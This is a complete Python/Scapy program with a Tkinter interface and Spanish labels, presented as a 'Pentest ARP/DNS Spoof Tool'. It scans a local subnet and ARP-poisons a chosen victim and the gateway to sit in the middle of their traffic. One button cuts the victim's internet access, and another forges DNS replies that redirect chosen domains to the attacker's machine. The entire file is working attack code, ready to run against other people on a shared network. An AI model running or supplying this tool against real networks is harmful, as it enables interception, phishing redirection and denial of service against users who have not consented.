import tkinter as tk
from tkinter import ttk, scrolledtext
from scapy.all import *
import threading
import time
import os

# Global variables
victim_ip = ""
domains_to_spoof = []
spoofing = False
dns_spoofing = False
log_lock = threading.Lock()
gateway_ip = conf.route.route("0.0.0.0")[2]

# UI Functions
def log(message):
    with log_lock:
        log_box.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        log_box.see(tk.END)

# Network Functions
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        log(f"[!] No se pudo obtener la MAC de {target_ip}")
        return

    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(pkt, verbose=0)

def restore_arp(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(pkt, count=5, verbose=0)

def start_arp_spoof():
    global spoofing
    spoofing = True
    log("[*] Iniciando ARP Spoofing...")
    def spoof_loop():
        while spoofing:
            arp_spoof(victim_ip_entry.get(), gateway_ip)
            arp_spoof(gateway_ip, victim_ip_entry.get())
            time.sleep(2)
    threading.Thread(target=spoof_loop, daemon=True).start()
    status_var.set("Spoofing activo")

def stop_spoofing():
    global spoofing
    spoofing = False
    restore_arp(victim_ip_entry.get(), gateway_ip)
    restore_arp(gateway_ip, victim_ip_entry.get())
    log("[*] Ataques detenidos y ARP restaurado.")
    status_var.set("Inactivo")

def scan_network():
    log("[*] Escaneando red con ARP Broadcast...")

    hosts_tree.delete(*hosts_tree.get_children())
    attacker_ip = get_if_addr(conf.iface)
    subnet = gateway_ip + "/24"  # Escanea toda la /24, ajusta si necesitas más

    try:
        answered, _ = arping(subnet, timeout=2, verbose=0)

        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc

            if ip == attacker_ip:
                ip_display = f"{ip} (HOST)"
            else:
                ip_display = ip

            hosts_tree.insert('', 'end', values=(ip_display, mac))
            log(f"[+] Host detectado: {ip_display} - {mac}")

        log("[*] Escaneo completado.")

    except Exception as e:
        log(f"[!] Error en escaneo: {e}")

def handle_host_selection(event):
    selected = hosts_tree.selection()
    if selected:
        item = hosts_tree.item(selected[0])
        ip = item['values'][0]
        victim_ip_entry.delete(0, tk.END)
        victim_ip_entry.insert(0, ip)

# Dejar sin internet a dicha IP victima
def leave_without_internet():
    global spoofing
    spoofing = True
    log("[*] Envenenando ARP para dejar sin Internet a la víctima...")

    victim_ip = victim_ip_entry.get().strip()
    if not victim_ip:
        log("[!] No se ha seleccionado IP de víctima.")
        return

    # Obtener IP del gateway y MAC del atacante
    gateway = conf.route.route("0.0.0.0")[2]
    attacker_mac = get_if_hwaddr(conf.iface)

    # Buscar la MAC de la víctima en el árbol
    victim_mac = None
    for child in hosts_tree.get_children():
        ip_value = hosts_tree.item(child, 'values')[0]
        mac_value = hosts_tree.item(child, 'values')[1]
        if victim_ip in ip_value:
            victim_mac = mac_value
            break

    if not victim_mac:
        log("[!] No se encontró la MAC asociada a la IP víctima.")
        return

    log(f"[*] MAC de la víctima ({victim_ip}): {victim_mac}")
    log(f"[*] IP del Gateway: {gateway}")
    log(f"[*] MAC del Atacante (tú): {attacker_mac}")

    def attack_loop():
        while spoofing:
            pkt = Ether(dst=victim_mac) / ARP(
                op=2,
                psrc=gateway,
                pdst=victim_ip,
                hwdst=victim_mac,
                hwsrc=attacker_mac
            )
            sendp(pkt, verbose=0, iface=conf.iface)
            log(f"[+] ARP enviado: {gateway} → {attacker_mac} (para {victim_ip})")
            time.sleep(2)

    threading.Thread(target=attack_loop, daemon=True).start()
    status_var.set("Internet bloqueado")

# DNS Spoofing
def start_dns_spoof():
    global dns_spoofing
    dns_spoofing = True
    log("[*] Iniciando DNS Spoofing real...")

    attacker_ip = get_if_addr(conf.iface)  # IP del atacante
    domains = [d.strip().lower() for d in domains_entry.get().split(",") if d.strip()]
    victim_ip = victim_ip_entry.get()

    if not domains:
        log("[!] No se ingresaron dominios a spoofear.")
        return

    def process_dns(pkt):
        if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt.haslayer(UDP):
            queried_domain = pkt[DNSQR].qname.decode().strip('.').lower()
            source_ip = pkt[IP].src

            if source_ip == victim_ip and any(domain in queried_domain for domain in domains):
                log(f"[+] Spoofing DNS para {queried_domain} → {attacker_ip}")

                spoofed_response = IP(dst=source_ip, src=pkt[IP].dst) / \
                    UDP(dport=pkt[UDP].sport, sport=53) / \
                    DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=attacker_ip)
                    )

                send(spoofed_response, verbose=0)

    def dns_sniffer():
        sniff(
            filter=f"udp port 53 and src host {victim_ip}",
            prn=process_dns,
            store=0
        )

    threading.Thread(target=dns_sniffer, daemon=True).start()
    status_var.set("DNS Spoofing activo")


# GUI Setup
app = tk.Tk()
app.title("Pentest ARP/DNS Spoof Tool")
app.configure(bg="black")
app.geometry("1000x600")

style = ttk.Style()
style.theme_use("clam")
style.configure("Treeview", background="black", foreground="lime", fieldbackground="black", font=('Consolas', 10))
style.configure("Treeview.Heading", background="black", foreground="white", font=('Consolas', 10, 'bold'))

# Frame Superior
frame_top = tk.Frame(app, bg="black")
frame_top.pack(pady=10)

tk.Label(frame_top, text="IP de la víctima:", fg="lime", bg="black").grid(row=0, column=0)
victim_ip_entry = tk.Entry(frame_top, width=20, bg="black", fg="lime", insertbackground='lime')
victim_ip_entry.grid(row=0, column=1, padx=5)

tk.Label(frame_top, text="Dominios a Spoofear:", fg="lime", bg="black").grid(row=0, column=2)
domains_entry = tk.Entry(frame_top, width=40, bg="black", fg="lime", insertbackground='lime')
domains_entry.grid(row=0, column=3, padx=5)

# Botones
frame_buttons = tk.Frame(app, bg="black")
frame_buttons.pack(pady=10)

tk.Button(frame_buttons, text="Iniciar Spoofing", command=start_arp_spoof, bg="green", fg="black").pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text="DNS Spoofing", command=start_dns_spoof, bg="orange", fg="black").pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text="Dejar sin internet", command=leave_without_internet, bg="red", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text="Escanear Red", command=lambda: threading.Thread(target=scan_network, daemon=True).start(), bg="blue", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(frame_buttons, text="Detener", command=stop_spoofing, bg="gray", fg="white").pack(side=tk.LEFT, padx=5)

# Indicador de estado
status_var = tk.StringVar(value="Inactivo")
tk.Label(app, textvariable=status_var, fg="cyan", bg="black", font=('Consolas', 12)).pack()

# Tabla de Hosts
hosts_tree = ttk.Treeview(app, columns=("IP", "MAC"), show="headings", height=10)
hosts_tree.heading("IP", text="Dirección IP")
hosts_tree.heading("MAC", text="Dirección MAC")
hosts_tree.bind("<Double-1>", handle_host_selection)
hosts_tree.pack(pady=10)

# Logs
log_box = scrolledtext.ScrolledText(app, bg="black", fg="lime", font=('Consolas', 10), height=10)
log_box.pack(fill="both", padx=10, pady=10, expand=True)

app.mainloop()
